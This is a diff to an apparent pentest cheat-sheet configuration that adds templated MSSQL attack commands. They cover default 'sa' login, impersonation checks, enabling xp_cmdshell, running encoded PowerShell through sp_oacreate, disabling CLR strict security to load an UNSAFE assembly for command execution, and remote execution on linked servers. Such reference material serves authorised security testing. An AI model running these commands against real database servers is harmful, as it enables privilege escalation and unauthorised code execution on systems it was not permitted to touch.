@@ -20,8 +20,102 @@ use_name = "mssqlclient"
 local = false
 cmd_types = "pentest|windows"
 short_desc = "Connect to a MSSQL database instance"
-args = "mssqlclient.py <username|sa>:<password|sa>@<ip|127.0.0.1> -db <dbname|master>"
+args = "mssqlclient.py -windows-auth -db <dbname|master> -port 1433 <username|sa>:<password|sa>@<ip|127.0.0.1>"
 examples = [
-    "mssqlclient.py sa:password@127.0.0.1 -db database"
+    "mssqlclient.py  -db master sa:password@127.0.0.1",
+    "mssqlclient.py -windows-auth -port 1433 sa:password@127.0.0.1"
 ]
 
+[command.SQLCommands0]
+use_name = "SQL Commands - MSSQL"
+local = true
+cmd_types = "sql"
+short_desc = "Count rows in tables"
+args = "SELECT t.name, p.rows FROM sys.tables t INNER JOIN sys.partitions p ON t.object_id = p.object_id WHERE p.index_id < 2;"
+
+[command.SQLCommands1]
+use_name = "SQL Commands - MSSQL"
+local = true
+cmd_types = "sql"
+short_desc = "Check server roles"
+args = "SELECT name FROM master.sys.server_principals WHERE type = 'R';"
+
+[command.SQLCommands2]
+use_name = "SQL Commands - MSSQL"
+local = true
+cmd_types = "sql"
+short_desc = "Check current user"
+args = "SELECT SYSTEM_USER; SELECT USER_NAME();"
+
+[command.SQLCommands3]
+use_name = "SQL Commands - MSSQL"
+local = true
+cmd_types = "sql"
+short_desc = "Check sysadmin role"
+args = "SELECT IS_SRVROLEMEMBER('sysadmin');"
+
+[command.SQLCommands4]
+use_name = "SQL Commands - MSSQL"
+local = true
+cmd_types = "sql"
+short_desc = "Check impersonation"
+args = "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';"
+details = """
+Then You can use: `EXECUTE AS LOGIN = 'sa';` to try to impersonate
+"""
+
+[command.SQLCommands5]
+use_name = "SQL Commands - MSSQL"
+local = true
+cmd_types = "sql"
+short_desc = "Setup xp_cmdshell"
+args = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell <command|whoami>;"
+
+[command.SQLCommands6]
+use_name = "SQL Commands - MSSQL"
+local = true
+cmd_types = "sql"
+short_desc = "Execution => sp_oacreate and sp_oamethod"
+args = "EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE; DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'powershell -enc <cmd-base64>';"
+
+[command.SQLCommands7]
+use_name = "SQL Commands - MSSQL"
+local = true
+cmd_types = "sql"
+short_desc = "Authorize DLL StoredProcedures"
+args = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'clr enabled',1; RECONFIGURE; EXEC sp_configure 'clr strict security',0; RECONFIGURE;"
+
+[command.SQLCommands8]
+use_name = "SQL Commands - MSSQL"
+local = true
+cmd_types = "sql"
+short_desc = "Add Trusted Assembly flag on DLL"
+args = "DECLARE @assembly varbinary(max) = <ASSEMBLY-HEX-DATA>;DECLARE @hash varbinary(64) = HASHBYTES('SHA2_512', @assembly); EXEC sp_add_trusted_assembly @hash,N'myAssembly is trusted';"
+
+[command.SQLCommands9]
+use_name = "SQL Commands - MSSQL"
+local = true
+cmd_types = "sql"
+short_desc = "Load and Exec DLL"
+args = "DECLARE @assembly varbinary(max) = <ASSEMBLY-HEX-DATA>;CREATE ASSEMBLY myAssembly FROM @assembly WITH PERMISSION_SET = UNSAFE;CREATE PROCEDURE [dbo].[cmdExec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [myAssembly].[SqlStoredProcedures].[cmdExec];EXEC cmdExec '<command>';"
+
+[command.SQLCommands10]
+use_name = "SQL Commands - MSSQL"
+local = true
+cmd_types = "sql"
+short_desc = "Linked SQL Listing"
+args = "EXEC sp_linkedservers;"
+
+[command.SQLCommands11]
+use_name = "SQL Commands - MSSQL"
+local = true
+cmd_types = "sql"
+short_desc = "Linked SQL Version check"
+args = "SELECT VERSION FROM OPENQUERY(\"<hostname|SQL01>\", 'SELECT @@VERSION as VERSION');"
+
+[command.SQLCommands12]
+use_name = "SQL Commands - MSSQL"
+local = true
+cmd_types = "sql"
+short_desc = "Linked SQL Remote Execution (AT)"
+args = "EXEC('sp_linkedservers') AT DC01;"
